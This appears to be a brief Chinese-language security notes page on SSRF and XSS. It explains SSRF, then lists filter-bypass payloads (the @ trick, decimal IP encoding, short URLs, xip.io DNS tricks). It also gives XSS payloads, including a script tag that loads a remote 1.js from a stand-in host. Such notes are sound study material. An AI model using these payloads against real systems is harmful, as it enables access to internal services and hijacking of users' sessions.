# SSRF&XSS
SRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）

SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。

## 常用绕过 payload等

        使用@：http://A.com@10.10.10.10 = 10.10.10.10
        IP地址转换成十进制、八进制：127.0.0.1 = 2130706433
        使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx
        端口绕过：ip后面加一个端口
        xip.io：10.0.0.1.xip.io = 10.0.0.1
                www.10.0.0.1.xip.io = 10.0.0.1
                mysite.10.0.0.1.xip.io = 10.0.0.1
                foo.bar.10.0.0.1.xip.io = 10.0.0.1
        通过js跳转

# XSS

## 常见payload

```js
<script>alert(1);</script>
<img src=0 onerror=alert(1)>
"><script src=http://www.xxx.com/1.js></script>"
```
反射XSS:欺骗用户点击，可能会被浏览器过滤

## 其他资料

- https://xianzhi.aliyun.com/forum/topic/83/
- http://kuza55.blogspot.hk/2008/02/csrf-ing-file-upload-fields.html